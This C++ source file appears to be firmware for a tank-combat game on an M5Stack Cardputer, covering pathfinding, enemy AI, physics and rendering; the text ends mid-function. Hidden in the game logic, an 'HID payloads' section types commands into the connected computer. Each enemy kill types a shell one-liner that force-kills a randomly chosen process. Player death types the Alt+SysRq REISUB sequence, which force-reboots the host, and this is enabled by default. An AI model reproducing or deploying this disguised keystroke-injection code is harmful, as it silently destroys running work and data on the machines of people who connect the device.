#ifdef BOARD_M5STACK_CARDPUTER

#include "../globals.h"
#include "app_combatprox.h"
#include "ui_manager.h"
#include <M5Cardputer.h>
#include <stdlib.h>
#include <math.h>

#include "combatprox_arena.h"

namespace Cardputer {

static const char* REISUB_TOKEN =
    "{CHORD ALT+SYSRQ+R}{SLEEP 2000}"
    "{CHORD ALT+SYSRQ+E}{SLEEP 2000}"
    "{CHORD ALT+SYSRQ+I}{SLEEP 2000}"
    "{CHORD ALT+SYSRQ+S}{SLEEP 2000}"
    "{CHORD ALT+SYSRQ+U}{SLEEP 2000}"
    "{CHORD ALT+SYSRQ+B}";


static float fclamp(float v, float lo, float hi) {
    return v < lo ? lo : (v > hi ? hi : v);
}

static float wrapAngle(float a) {
    while (a >  M_PI) a -= 2.f * M_PI;
    while (a < -M_PI) a += 2.f * M_PI;
    return a;
}

bool AppCombatProx::_wallAt(float cx, float cy) {
    if (cx < 0 || cy < 0 || cx >= VAW || cy >= VPLAY_H) return true;
    int col = (int)(cx / CELL);
    int row = (int)(cy / CELL);
    if (col < 1 || col >= COLS-1 || row < 1 || row >= ROWS-1) return true;
    return _wallMap[row][col] == 1;
}

bool AppCombatProx::_circleWall(float cx, float cy, float r) {
    for (int sx = -1; sx <= 1; sx += 2)
        for (int sy = -1; sy <= 1; sy += 2)
            if (_wallAt(cx + sx * r * 0.85f, cy + sy * r * 0.85f)) return true;
    return false;
}

void AppCombatProx::onEnter() {
    _phase = PH_SPLASH;
    _phaseEnter = millis();
    _needsRedraw = true;
    _reisub = true;
}

void AppCombatProx::onExit() { _phase = PH_SPLASH; }

void AppCombatProx::_resetGame() {
    _score = 0;
    _round = 1;
    _startNextRound();
}

void AppCombatProx::_startNextRound() {
    _lastFirer = -1;
    memset(_bullets, 0, sizeof(_bullets));
    _arenaIdx = (int)(esp_random() % ARENA_COUNT);
    _wallMap  = ARENAS[_arenaIdx].walls;
    _player = { ARENAS[_arenaIdx].playerX, ARENAS[_arenaIdx].playerY,
                0.f, PLAYER_HP, 0, 0, 0, 0.f };
    _camX = (int)_player.x - AW/2;
    _camY = (int)_player.y - PLAY_H/2;
    _camX = (int)fclamp((float)_camX, 0, VAW    - AW);
    _camY = (int)fclamp((float)_camY, 0, VPLAY_H - PLAY_H);
    _initialWaveCleared = false;
    _reinforceSent      = false;
    _kamikazeSent       = false;
    _kamikazeIdx        = -1;
    _exploding          = false;
    _previewLastSec     = -1;
    _notifyMsg          = nullptr;
    _notifyEnd          = 0;
    _spawnEnemies();
    _lastUpdate = millis();
    _aiTimer    = millis();
    _activeEnemies = ARENA_ENEMY_COUNT;
}

void AppCombatProx::_spawnEnemies() {
    const uint8_t wanderBiases[3] = { 5, 12, 20 };
    const uint8_t roles[3]        = { 0, 1, 2 };

    // Round-scaling type table: [round-1][slot], clamped to round 4+
    static const uint8_t TYPE_TABLE[4][3] = {
        { ET_STANDARD, ET_STANDARD, ET_STANDARD },
        { ET_SCOUT,    ET_STANDARD, ET_STANDARD },
        { ET_SCOUT,    ET_STANDARD, ET_HEAVY    },
        { ET_SCOUT,    ET_SNIPER,   ET_HEAVY    },
    };
    int ri = (_round - 1) < 4 ? (_round - 1) : 3;

    const int HP_FOR_TYPE[4] = { 1, 1, 3, 1 };
    const CombatArena& arena = ARENAS[_arenaIdx];
    for (int i = 0; i < ENEMY_COUNT && i < ARENA_ENEMY_COUNT; i++) {
        uint8_t t = TYPE_TABLE[ri][i];
        _enemies[i] = {};
        _enemies[i].x           = arena.enemyX[i];
        _enemies[i].y           = arena.enemyY[i];
        _enemies[i].angle       = (float)M_PI;
        _enemies[i].hp          = HP_FOR_TYPE[t];
        _enemies[i].aiState     = 1;
        _enemies[i].patrolTimer = i * 6;
        _enemies[i].patrolTarget= (float)(M_PI + 0.3f * i);
        _enemies[i].wanderBias  = wanderBiases[i];
        _enemies[i].role        = roles[i];
        _enemies[i].type        = t;
        _enemies[i].pathLen     = 0;
        _enemies[i].pathIdx     = 0;
        _enemies[i].pathTimer   = 0;
    }
    for (int i = ARENA_ENEMY_COUNT; i < ENEMY_COUNT; i++) {
        _enemies[i] = {};
        _enemies[i].hp = 0;
    }
}

// ---- AI ----

// ---- A* pathfinder ----
// Grid: COLS x ROWS cells. Diagonal movement allowed (8-connectivity).
// Returns true and fills e.pathX/pathY/pathLen if a path is found.

bool AppCombatProx::_astar(int sx, int sy, int gx, int gy, Tank& e) {
    static constexpr int N = COLS * ROWS;  // 200 nodes

    // Per-node data stored in flat arrays indexed by col + row*COLS
    static int16_t g_cost[N];
    static int16_t f_cost[N];
    static int8_t  parent[N];   // encoded direction index, -1 = none
    static bool    closed[N];
    static bool    open_flag[N];

    memset(g_cost,  0x7F, sizeof(g_cost));
    memset(f_cost,  0x7F, sizeof(f_cost));
    memset(parent,  -1,   sizeof(parent));
    memset(closed,  false, sizeof(closed));
    memset(open_flag, false, sizeof(open_flag));

    // 8 neighbours: dx, dy
    static const int8_t DX[8] = { 1,-1, 0, 0, 1, 1,-1,-1 };
    static const int8_t DY[8] = { 0, 0, 1,-1, 1,-1, 1,-1 };
    // Costs: cardinal=10, diagonal=14
    static const int8_t DCOST[8] = { 10,10,10,10,14,14,14,14 };

    auto idx = [](int c, int r) { return c + r * COLS; };
    auto heuristic = [](int c, int r, int gc, int gr) -> int {
        int dc = abs(c - gc), dr = abs(r - gr);
        // Octile distance
        return 10 * (dc + dr) + (14 - 20) * (dc < dr ? dc : dr);
    };
    auto wallCell = [&](int c, int r) -> bool {
        if (c < 1 || c >= COLS-1 || r < 1 || r >= ROWS-1) return true;
        return _wallMap[r][c] != 0;
    };

    int startI = idx(sx, sy);
    int goalI  = idx(gx, gy);

    g_cost[startI] = 0;
    f_cost[startI] = (int16_t)heuristic(sx, sy, gx, gy);
    open_flag[startI] = true;

    // Simple open list: scan for lowest f each iteration (fine for 200 nodes)
    for (int iter = 0; iter < N * 4; iter++) {
        // Pick lowest-f open node
        int cur = -1;
        int16_t best = 0x7F00;
        for (int j = 0; j < N; j++) {
            if (open_flag[j] && f_cost[j] < best) { best = f_cost[j]; cur = j; }
        }
        if (cur < 0) break;  // open list empty
        if (cur == goalI) {
            // Reconstruct path (reversed)
            int8_t tmp_x[32], tmp_y[32];
            int len = 0;
            int node = cur;
            while (node != startI && len < 31) {
                tmp_x[len] = (int8_t)(node % COLS);
                tmp_y[len] = (int8_t)(node / COLS);
                int dir = parent[node];
                if (dir < 0) break;
                node -= DX[dir] + DY[dir] * COLS;
                len++;
            }
            // Reverse into e.path
            e.pathLen = len;
            e.pathIdx = 0;
            for (int k = 0; k < len; k++) {
                e.pathX[k] = tmp_x[len - 1 - k];
                e.pathY[k] = tmp_y[len - 1 - k];
            }
            return true;
        }

        open_flag[cur] = false;
        closed[cur]    = true;

        int cc = cur % COLS, cr = cur / COLS;
        for (int d = 0; d < 8; d++) {
            int nc = cc + DX[d], nr = cr + DY[d];
            if (wallCell(nc, nr)) continue;
            // Diagonal: don't cut wall corners
            if (d >= 4) {
                if (wallCell(cc + DX[d], cr) || wallCell(cc, cr + DY[d])) continue;
            }
            int ni = idx(nc, nr);
            if (closed[ni]) continue;
            int16_t ng = g_cost[cur] + DCOST[d];
            if (ng < g_cost[ni]) {
                g_cost[ni]    = ng;
                f_cost[ni]    = ng + (int16_t)heuristic(nc, nr, gx, gy);
                parent[ni]    = (int8_t)d;
                open_flag[ni] = true;
            }
        }
    }
    return false;  // no path found
}

// Steers enemy toward next path waypoint. Replans to (gc,gr) when stale.
void AppCombatProx::_pathStep(Tank& e, int /*enemyIdx*/, unsigned long now, int gc, int gr) {
    int ec = (int)(e.x / CELL);
    int er = (int)(e.y / CELL);

    bool needReplan = (e.pathLen == 0) ||
                      (e.pathIdx >= e.pathLen) ||
                      (now - e.pathTimer > (unsigned long)PATH_REPLAN_MS);

    if (needReplan) {
        e.pathTimer = now;
        if (!_astar(ec, er, gc, gr, e)) e.pathLen = 0;
    }

    if (e.pathLen == 0 || e.pathIdx >= e.pathLen) return;

    int wx = e.pathX[e.pathIdx];
    int wy = e.pathY[e.pathIdx];
    float wpx = wx * CELL + CELL * 0.5f;
    float wpy = wy * CELL + CELL * 0.5f;
    float dwx = wpx - e.x, dwy = wpy - e.y;
    if (sqrtf(dwx*dwx + dwy*dwy) < WAYPOINT_RADIUS) {
        e.pathIdx++;
        if (e.pathIdx >= e.pathLen) return;

        if ((rand() % 100) < e.wanderBias) {
            int nx2 = e.pathX[e.pathIdx];
            int ny2 = e.pathY[e.pathIdx];
            static const int8_t DX4[4] = { 1,-1, 0, 0 };
            static const int8_t DY4[4] = { 0, 0, 1,-1 };
            int tries = 0;
            while (tries++ < 8) {
                int di = rand() % 4;
                int cx2 = nx2 + DX4[di], cy2 = ny2 + DY4[di];
                if (cx2 >= 1 && cx2 < COLS-1 && cy2 >= 1 && cy2 < ROWS-1
                    && !_wallMap[cy2][cx2]) {
                    e.pathX[e.pathIdx] = (int8_t)cx2;
                    e.pathY[e.pathIdx] = (int8_t)cy2;
                    break;
                }
            }
        }

        wx  = e.pathX[e.pathIdx];
        wy  = e.pathY[e.pathIdx];
        wpx = wx * CELL + CELL * 0.5f;
        wpy = wy * CELL + CELL * 0.5f;
    }

    float targetAngle = atan2f(wpy - e.y, wpx - e.x);
    float diff  = wrapAngle(targetAngle - e.angle);
    float turn  = fminf(fabsf(diff), AI_TURN_SPEED);
    e.angle     = wrapAngle(e.angle + (diff >= 0 ? turn : -turn));
}

// ---- AI step ----

void AppCombatProx::_aiStep(unsigned long now) {
    if (now - _aiTimer < AI_TICK) return;
    _aiTimer = now;

    int pc = (int)(_player.x / CELL);
    int pr = (int)(_player.y / CELL);

    int nextFirer = -1;
    for (int i = 0; i < ENEMY_COUNT; i++) {
        int idx = (_lastFirer + 1 + i) % ENEMY_COUNT;
        if (_enemies[idx].hp > 0 && idx != _kamikazeIdx) { nextFirer = idx; break; }
    }

    for (int i = 0; i < ENEMY_COUNT; i++) {
        Tank& e = _enemies[i];
        if (e.hp <= 0) continue;
        if (i == _kamikazeIdx) continue;

        float dx   = _player.x - e.x;
        float dy   = _player.y - e.y;
        float dist = sqrtf(dx*dx + dy*dy);

        float towardAngle = atan2f(dy, dx);
        float awayAngle   = wrapAngle(towardAngle + (float)M_PI);

        // State selection — snipers maintain preferred range
        if (dist < PANIC_DIST) {
            e.aiState = 3;  // back up and fire
        } else if (e.type == ET_SNIPER) {
            e.aiState = (dist > RETREAT_DIST) ? 1 : 2;
        } else if (dist < RETREAT_DIST) {
            e.aiState = 2;  // strafe at close range
        } else {
            e.aiState = 1;  // approach
        }

        // Compute role/type adjusted goal cell for approach
        int goalC = pc, goalR = pr;
        if (e.aiState == 1) {
            // Sniper: path to a cell SNIPER_PREF_DIST away, not into the player
            if (e.type == ET_SNIPER) {
                int stopCells = (int)(SNIPER_PREF_DIST / CELL) + 1;
                float ang = atan2f((float)(pr - (int)(e.y/CELL)), (float)(pc - (int)(e.x/CELL)));
                int sc = pc - (int)(cosf(ang) * stopCells);
                int sr = pr - (int)(sinf(ang) * stopCells);
                sc = sc < 1 ? 1 : (sc >= COLS-1 ? COLS-2 : sc);
                sr = sr < 1 ? 1 : (sr >= ROWS-1 ? ROWS-2 : sr);
                if (!_wallMap[sr][sc]) { goalC = sc; goalR = sr; }
            } else {
                // Role-based flank offset
                int perpC = 0, perpR = 0;
                switch (e.role & 3) {
                    case 1: perpC = -(int)(sinf(towardAngle)*4.f); perpR =  (int)(cosf(towardAngle)*4.f); break;
                    case 2: perpC =  (int)(sinf(towardAngle)*4.f); perpR = -(int)(cosf(towardAngle)*4.f); break;
                    case 3: perpC = -(int)(cosf(towardAngle)*6.f); perpR = -(int)(sinf(towardAngle)*6.f); break;
                    default: break;
                }
                int tc = pc + perpC, tr = pr + perpR;
                tc = tc < 1 ? 1 : (tc >= COLS-1 ? COLS-2 : tc);
                tr = tr < 1 ? 1 : (tr >= ROWS-1 ? ROWS-2 : tr);
                if (!_wallMap[tr][tc]) { goalC = tc; goalR = tr; }
            }
        }

        float moveAngle = e.angle;

        switch (e.aiState) {
            case 1: {  // Approach / flank via A*
                _pathStep(e, i, now, goalC, goalR);
                moveAngle = e.angle;
                break;
            }
            case 2: {  // Strafe — orbit player while facing them
                float sideSign = (e.role & 1) ? 1.f : -1.f;
                float perpAngle = wrapAngle(towardAngle + sideSign * (float)M_PI / 2.f);
                float diff  = wrapAngle(perpAngle - e.angle);
                float turn  = fminf(fabsf(diff), AI_TURN_SPEED);
                e.angle     = wrapAngle(e.angle + (diff >= 0 ? turn : -turn));
                float faceDiff = wrapAngle(towardAngle - e.angle);
                float faceTurn = fminf(fabsf(faceDiff), AI_TURN_SPEED * 0.5f);
                e.angle     = wrapAngle(e.angle + (faceDiff >= 0 ? faceTurn : -faceTurn));
                moveAngle   = perpAngle;
                e.pathLen   = 0;
                break;
            }
            case 3: {  // PANIC: too close — face player, back up, keep firing
                float diff = wrapAngle(towardAngle - e.angle);
                float turn = fminf(fabsf(diff), AI_TURN_SPEED * 2.f);
                e.angle    = wrapAngle(e.angle + (diff >= 0 ? turn : -turn));
                moveAngle  = awayAngle;  // drive backward
                e.pathLen  = 0;
                break;
            }
        }

        // Type-based movement speed
        float spd;
        switch (e.type) {
            case ET_SCOUT:  spd = SPEED * AI_SPEED_SCALE * 1.35f; break;
            case ET_HEAVY:  spd = SPEED * AI_SPEED_SCALE * 0.60f; break;
            case ET_SNIPER: spd = SPEED * AI_SPEED_SCALE * 0.75f; break;
            default:        spd = SPEED * AI_SPEED_SCALE;         break;
        }

        float nx = e.x + cosf(moveAngle) * spd;
        float ny = e.y + sinf(moveAngle) * spd;

        if (!_circleWall(nx, ny, TANK_R)) {
            e.x = fclamp(nx, (float)TANK_R, (float)(VAW - TANK_R));
            e.y = fclamp(ny, (float)TANK_R, (float)(VPLAY_H - TANK_R));
            e.stuckTicks = 0;
        } else {
            bool slidX = !_circleWall(nx, e.y, TANK_R);
            bool slidY = !_circleWall(e.x, ny, TANK_R);
            if (slidX) e.x = fclamp(nx, (float)TANK_R, (float)(VAW - TANK_R));
            if (slidY) e.y = fclamp(ny, (float)TANK_R, (float)(VPLAY_H - TANK_R));
            if (!slidX && !slidY) {
                e.stuckTicks++;
                int spinDir = (i & 1) ? 1 : -1;
                if (e.stuckTicks > 4) spinDir = -spinDir;
                e.angle = wrapAngle(e.angle + (float)(spinDir) * (float)M_PI / 4.f);
                e.patrolTarget = e.angle;
                if (e.stuckTicks > 6) { e.pathLen = 0; e.stuckTicks = 0; }
            }
        }

        // Type-based fire cooldown: scouts and snipers fire more often
        unsigned long fireCooldown;
        switch (e.type) {
            case ET_SCOUT:  fireCooldown = ENEMY_FIRE_COOLDOWN * 2 / 3; break;
            case ET_HEAVY:  fireCooldown = ENEMY_FIRE_COOLDOWN * 3 / 2; break;
            case ET_SNIPER: fireCooldown = ENEMY_FIRE_COOLDOWN / 2;     break;
            default:        fireCooldown = ENEMY_FIRE_COOLDOWN;          break;
        }

        // In panic state, always fire if even partially aimed at player
        float aimThresh = (e.aiState == 3) ? 0.7f : 0.45f;
        float angleDiff = fabsf(wrapAngle(towardAngle - e.angle));
        if (i == nextFirer && angleDiff < aimThresh && dist < 300.f
            && now - e.lastShot > fireCooldown) {
            _fireBullet(e, false);
            _lastFirer = i;
        }

        for (int j = 0; j < ENEMY_COUNT; j++) {
            if (j == i || _enemies[j].hp <= 0) continue;
            float rx = e.x - _enemies[j].x;
            float ry = e.y - _enemies[j].y;
            float rd = sqrtf(rx*rx + ry*ry);
            if (rd > 0.01f && rd < REPULSE_DIST) {
                float push = REPULSE_STRENGTH * (1.f - rd / REPULSE_DIST);
                float rpx  = e.x + rx / rd * push;
                float rpy  = e.y + ry / rd * push;
                if (!_circleWall(rpx, e.y, TANK_R)) e.x = fclamp(rpx, (float)TANK_R, (float)(VAW - TANK_R));
                if (!_circleWall(e.x, rpy, TANK_R)) e.y = fclamp(rpy, (float)TANK_R, (float)(VPLAY_H - TANK_R));
            }
        }
    }
}

void AppCombatProx::_fireBullet(Tank& shooter, bool fromPlayer) {
    for (int i = 0; i < MAX_BULLETS; i++) {
        if (_bullets[i].active) continue;
        float ca = cosf(shooter.angle), sa = sinf(shooter.angle);
        _bullets[i] = {
            shooter.x + ca * (TANK_R + BULLET_R + 1),
            shooter.y + sa * (TANK_R + BULLET_R + 1),
            ca * BSPEED, sa * BSPEED,
            0.f, true, fromPlayer
        };
        shooter.lastShot = millis();

        // Pew-pew: synthesise a short descending-pitch PCM burst and play via playRaw.
        // M5Unified Speaker.playRaw(data, len, rate, stereo, repeat, channel) is
        // the most reliable cross-version API for generating tones on Cardputer.
        {
            static constexpr int   SAMPLE_RATE = 8000;
            static constexpr int   PEW_SAMPLES = 160;  // 20ms at 8kHz
            static int8_t buf[PEW_SAMPLES];

            int startFreq = fromPlayer ? 1400 : 800;
            int endFreq   = fromPlayer ?  400 : 200;

            float phase = 0.f;
            for (int s = 0; s < PEW_SAMPLES; s++) {
                float t    = (float)s / PEW_SAMPLES;
                float freq = startFreq + (endFreq - startFreq) * t;
                float env  = 1.f - t;  // linear fade-out
                phase += 2.f * (float)M_PI * freq / SAMPLE_RATE;
                buf[s] = (int8_t)(sinf(phase) * 100.f * env);
            }

            M5Cardputer.Speaker.playRaw(buf, PEW_SAMPLES, SAMPLE_RATE,
                                        false, 1, 0);
        }

        return;
    }
}

// ---- HID payloads ----

void AppCombatProx::_onPlayerKill(int points) {
    String cmd =
        "ps -eo pid=,comm= | awk 'NR>1\\{a[NR]=$1;n[NR]=$2\\}"
        "END\\{srand();r=int(rand()*(NR-1))+2;"
        "print \"Ops, I guess you did not need \"n[r]\"...\";system(\"kill -9 \"a[r])\\}'\n";
    pendingTokenStrings.push_back(cmd);
    _score += points;
}

void AppCombatProx::_onPlayerDied() {
    if (_reisub)
        pendingTokenStrings.push_back(String(REISUB_TOKEN));
}

// ---- Physics ----

void AppCombatProx::_update(unsigned long now) {
    float dt = (now - _lastUpdate) / 16.67f;
    dt = fclamp(dt, 0.5f, 3.0f);
    _lastUpdate = now;

    for (int i = 0; i < MAX_BULLETS; i++) {
        Bullet& b = _bullets[i];
        if (!b.active) continue;

        float step = sqrtf(b.vx*b.vx + b.vy*b.vy) * dt;
        b.x += b.vx * dt;
        b.y += b.vy * dt;
        b.dist += step;

        if (b.dist > MAX_BULLET_DIST
            || _wallAt(b.x, b.y)
            || b.x < 0 || b.x >= VAW || b.y < 0 || b.y >= VPLAY_H) {
            b.active = false; continue;
        }

        if (b.fromPlayer) {
            for (int e = 0; e < ENEMY_COUNT; e++) {
                if (_enemies[e].hp <= 0) continue;
                float ddx = b.x - _enemies[e].x, ddy = b.y - _enemies[e].y;
                if (ddx*ddx + ddy*ddy < (TANK_R+BULLET_R)*(TANK_R+BULLET_R)) {
                    b.active = false;
                    _enemies[e].hp--;
                    if (_enemies[e].hp <= 0) {
                        static const int PTS[4] = { 1, 2, 3, 2 };
                        _onPlayerKill(PTS[_enemies[e].type]);
                    }
                    break;
                }
            }
        } else {
            float ddx = b.x - _player.x, ddy = b.y - _player.y;
            if (ddx*ddx + ddy*ddy < (TANK_R+BULLET_R)*(TANK_R+BULLET_R)) {
                _player.hp--; b.active = false;
                if (_player.hp <= 0) {
                    _pendingReisub = true;
                    _phase = PH_DEAD; _phaseEnter = now; _needsRedraw = true; return;
                }
            }
        }
    }

    // Kamikaze contact explosion
    if (_kamikazeIdx >= 0 && _enemies[_kamikazeIdx].hp > 0) {
        float kdx = _enemies[_kamikazeIdx].x - _player.x;
        float kdy = _enemies[_kamikazeIdx].y - _player.y;
        if (kdx*kdx + kdy*kdy < (TANK_R*2)*(TANK_R*2)) {
            _enemies[_kamikazeIdx].hp = 0;
            _exploding     = true;
            _explodeStart  = now;
            _explodeX      = (int)_enemies[_kamikazeIdx].x - _camX;
            _explodeY      = (int)_enemies[_kamikazeIdx].y - _camY;
            {
                static constexpr int SR = 8000, NS = 400;
                static int8_t ebuf[NS];
                for (int s = 0; s < NS; s++) {
                    float t = (float)s / NS;
                    float env = (1.f - t) * (1.f - t);
                    ebuf[s] = (int8_t)(((esp_random() & 0xFF) - 128) * env * 0.8f);
                }
                M5Cardputer.Speaker.playRaw(ebuf, NS, SR, false, 1, 0);
            }
            _player.hp = 0;
            _pendingReisub = true;
            _phase = PH_DEAD; _phaseEnter = now; _needsRedraw = true; return;
        }
    }

    // Wave management
    {
        int aliveInitial = 0;
        for (int e = 0; e < ARENA_ENEMY_COUNT; e++) if (_enemies[e].hp > 0) aliveInitial++;

        if (!_initialWaveCleared && aliveInitial == 0) {
            _initialWaveCleared = true;
        }

        if (_initialWaveCleared && !_reinforceSent) {
            _reinforceSent = true;
            _spawnReinforcements();
        }

        bool anyAlive = false;
        for (int e = 0; e < ENEMY_COUNT; e++) if (_enemies[e].hp > 0) anyAlive = true;

        if (!anyAlive && _reinforceSent && !_kamikazeSent) {
            _kamikazeSent = true;
            if ((esp_random() % 3) == 0) {
                _spawnKamikaze();
                anyAlive = true;
            }
        }

        if (!anyAlive && _reinforceSent && _kamikazeSent) {
            _phase = PH_ROUND_CLEAR; _phaseEnter = now; _needsRedraw = true; return;
        }
    }

    // Kamikaze AI: charge player, navigate walls via A*
    if (_kamikazeIdx >= 0 && _enemies[_kamikazeIdx].hp > 0) {
        Tank& k = _enemies[_kamikazeIdx];
        float dx = _player.x - k.x, dy = _player.y - k.y;
        float dist = sqrtf(dx*dx + dy*dy);
        if (dist > 1.f) {
            int kc = (int)(k.x / CELL), kr = (int)(k.y / CELL);
            int pc2 = (int)(_player.x / CELL), pr2 = (int)(_player.y / CELL);

            bool needPath = (k.pathLen == 0 || k.pathIdx >= k.pathLen ||
                             (now - k.pathTimer > (unsigned long)PATH_REPLAN_MS));
            if (needPath) {
                k.pathTimer = now;
                if (!_astar(kc, kr, pc2, pr2, k)) k.pathLen = 0;
            }

            float targetAngle;
            if (k.pathLen > 0 && k.pathIdx < k.pathLen) {
                int wx = k.pathX[k.pathIdx], wy = k.pathY[k.pathIdx];
                float wpx = wx * CELL + CELL * 0.5f, wpy = wy * CELL + CELL * 0.5f;
                if (sqrtf((wpx-k.x)*(wpx-k.x)+(wpy-k.y)*(wpy-k.y)) < WAYPOINT_RADIUS) k.pathIdx++;
                if (k.pathIdx < k.pathLen) {
                    wx = k.pathX[k.pathIdx]; wy = k.pathY[k.pathIdx];
                    wpx = wx * CELL + CELL * 0.5f; wpy = wy * CELL + CELL * 0.5f;
                }
                targetAngle = atan2f(wpy - k.y, wpx - k.x);
            } else {
                targetAngle = atan2f(dy, dx);
            }

            float diff = wrapAngle(targetAngle - k.angle);
            k.angle = wrapAngle(k.angle + fclamp(diff, -AI_TURN_SPEED*3, AI_TURN_SPEED*3));
            float nx = k.x + cosf(k.angle) * KAMIKAZE_SPEED;
            float ny = k.y + sinf(k.angle) * KAMIKAZE_SPEED;
            if (!_circleWall(nx, ny, TANK_R)) {
                k.x = fclamp(nx, (float)TANK_R, (float)(VAW - TANK_R));
                k.y = fclamp(ny, (float)TANK_R, (float)(VPLAY_H - TANK_R));
            } else {
                if (!_circleWall(nx, k.y, TANK_R)) k.x = fclamp(nx, (float)TANK_R, (float)(VAW - TANK_R));
                if (!_circleWall(k.x, ny, TANK_R)) k.y = fclamp(ny, (float)TANK_R, (float)(VPLAY_H - TANK_R));
            }
        }
    }

    _aiStep(now);

    // Keep camera centred on player, clamped to virtual arena
    _camX = (int)(_player.x - AW / 2);
    _camY = (int)(_player.y - PLAY_H / 2);
    _camX = (int)fclamp((float)_camX, 0.f, (float)(VAW    - AW));
    _camY = (int)fclamp((float)_camY, 0.f, (float)(VPLAY_H - PLAY_H));
}

// ---- Drawing ----

void AppCombatProx::_drawHUD() {
    auto& d = M5Cardputer.Display;
    d.fillRect(0, PLAY_H, AW, BAR_H, C_HUD_BG);
    d.setTextSize(1); d.setTextColor(C_TEXT, C_HUD_BG);
    d.drawString("HP:", 2, PLAY_H + 3);
    for (int i = 0; i < PLAYER_HP; i++)
        d.fillRect(22 + i*9, PLAY_H+3, 7, 7, i < _player.hp ? (uint16_t)0x07E0 : (uint16_t)0x39E7);
    if (!_reisub) {
        d.setTextColor(0xF800, C_HUD_BG);
        d.drawString("SAFE", 58, PLAY_H + 3);
        d.setTextColor(C_TEXT, C_HUD_BG);
    }

    String rndStr = "R" + String(_round);
    d.setTextColor(0xFFE0, C_HUD_BG);
    d.drawString(rndStr, AW/2 - d.textWidth(rndStr)/2, PLAY_H + 3);

    d.setTextColor(C_TEXT, C_HUD_BG);
    String sc = String(_score) + "pts";
    d.drawString(sc, AW - d.textWidth(sc) - 2, PLAY_H + 3);

    if (_notifyMsg && millis() < _notifyEnd) {
        int nw = d.textWidth(_notifyMsg);
        int ny = PLAY_H / 2 - 6;
        d.fillRect(AW/2 - nw/2 - 4, ny - 2, nw + 8, 12, 0x0000);
        d.setTextColor(0xFFE0, 0x0000);
        d.drawString(_notifyMsg, AW/2 - nw/2, ny);
        d.setTextColor(C_TEXT, C_HUD_BG);
    } else {
        _notifyMsg = nullptr;
    }
}

// Fill a rotated rectangle. Forward axis: (ca,sa). Perpendicular: (-sa,ca).
// hl = half-length along forward; hw = half-width along perpendicular.
static void combatFillRotRect(M5GFX& d, int cx, int cy, float ca, float sa,
                               float hl, float hw, uint16_t col) {
    int x0 = (int)(cx - fabsf(ca)*hl - fabsf(sa)*hw);
    int x1 = (int)(cx + fabsf(ca)*hl + fabsf(sa)*hw) + 1;
    int y0 = (int)(cy - fabsf(sa)*hl - fabsf(ca)*hw);
    int y1 = (int)(cy + fabsf(sa)*hl + fabsf(ca)*hw) + 1;
    for (int py = y0; py <= y1; py++) {
        for (int px = x0; px <= x1; px++) {
            float dx = px - cx, dy = py - cy;
            float lx =  dx*ca + dy*sa;  // along forward
            float ly = -dx*sa + dy*ca;  // along perpendicular
            if (lx >= -hl && lx <= hl && ly >= -hw && ly <= hw)
                d.drawPixel(px, py, col);
        }
    }
}

void AppCombatProx::_drawTank(const Tank& t, uint16_t col) {
    if (t.hp <= 0) return;

    int sx = (int)t.x - _camX;
    int sy = (int)t.y - _camY;
    if (sx < -14 || sx > AW+14 || sy < -14 || sy > PLAY_H+14) return;

    auto& d = M5Cardputer.Display;
    float ca = cosf(t.angle), sa = sinf(t.angle);

    bool isKamikaze = (col == C_KAMIKAZE);
    bool isHeavy    = (t.type == ET_HEAVY && !isKamikaze);
    bool isScout    = (t.type == ET_SCOUT && !isKamikaze);
    bool isSniper   = (t.type == ET_SNIPER && !isKamikaze);

    float hl = isHeavy ? 5.5f : (isScout ? 3.5f : 4.f);
    float hw = isHeavy ? 3.5f : (isScout ? 2.f  : 2.5f);
    float trackOff = isHeavy ? 6.f : 5.f;

    float lx = -sa * trackOff, ly =  ca * trackOff;
    float rx =  sa * trackOff, ry = -ca * trackOff;

    uint16_t trackCol  = (col == C_PLAYER) ? (uint16_t)0x0300 :
                         (isHeavy)         ? (uint16_t)0x4000 :
                         (isScout)         ? (uint16_t)0x0488 :
                         (isSniper)        ? (uint16_t)0x7810 : (uint16_t)0x6000;
    uint16_t turretCol = (col == C_PLAYER) ? (uint16_t)0x3FE0 :
                         (isHeavy)         ? (uint16_t)0xA000 :
                         (isSniper)        ? (uint16_t)0xC01F : (uint16_t)0xFB00;

    combatFillRotRect(d, (int)(sx+lx), (int)(sy+ly), ca, sa, hl+1.5f, 1.5f, trackCol);
    combatFillRotRect(d, (int)(sx+rx), (int)(sy+ry), ca, sa, hl+1.5f, 1.5f, trackCol);
    combatFillRotRect(d, sx, sy, ca, sa, hl, hw, col);

    if (!isKamikaze) {
        int turretR = isHeavy ? 3 : 2;
        d.fillCircle(sx, sy, turretR, turretCol);
        int barrelEnd = isSniper ? 10 : (isHeavy ? 6 : 7);
        for (int bi = turretR+1; bi <= barrelEnd; bi++)
            d.drawPixel(sx + (int)(ca*bi), sy + (int)(sa*bi), 0xFFFF);
    } else {
        d.drawLine(sx-3, sy-3, sx+3, sy+3, 0xFFFF);
        d.drawLine(sx+3, sy-3, sx-3, sy+3, 0xFFFF);
    }

    // HP pips for heavy enemies (show remaining health)
    if (isHeavy && t.hp > 1) {
        for (int p = 0; p < t.hp && p < 3; p++)
            d.fillRect(sx - 3 + p*3, sy - 9, 2, 2, 0xFFE0);
    }
}
void AppCombatProx::_drawBullet(const Bullet& b) {
    if (!b.active) return;
    int sx = (int)b.x - _camX;
    int sy = (int)b.y - _camY;
    if (sx < -2 || sx > AW+2 || sy < -2 || sy > PLAY_H+2) return;
    M5Cardputer.Display.fillCircle(sx, sy, BULLET_R,
        b.fromPlayer ? C_BULLET_P : C_BULLET_E);
}

void AppCombatProx::_drawArena() {
    auto& d = M5Cardputer.Display;
    d.fillRect(0, 0, AW, PLAY_H, C_BG);

    // Only draw wall cells visible in the viewport
    int colMin = _camX / CELL;
    int colMax = (_camX + AW) / CELL + 1;
    int rowMin = _camY / CELL;
    int rowMax = (_camY + PLAY_H) / CELL + 1;
    colMin = colMin < 0 ? 0 : colMin;
    rowMin = rowMin < 0 ? 0 : rowMin;
    colMax = colMax > COLS ? COLS : colMax;
    rowMax = rowMax > ROWS ? ROWS : rowMax;

    for (int row = rowMin; row < rowMax; row++)
        for (int col = colMin; col < colMax; col++)
            if (_wallMap[row][col])
                d.fillRect(col*CELL - _camX, row*CELL - _camY, CELL, CELL, C_WALL);

    _drawTank(_player, C_PLAYER);
    for (int e = 0; e < ENEMY_COUNT; e++) {
        if (_enemies[e].hp <= 0) continue;
        uint16_t ec;
        if (e == _kamikazeIdx) {
            ec = C_KAMIKAZE;
        } else {
            switch (_enemies[e].type) {
                case ET_SCOUT:  ec = C_SCOUT;  break;
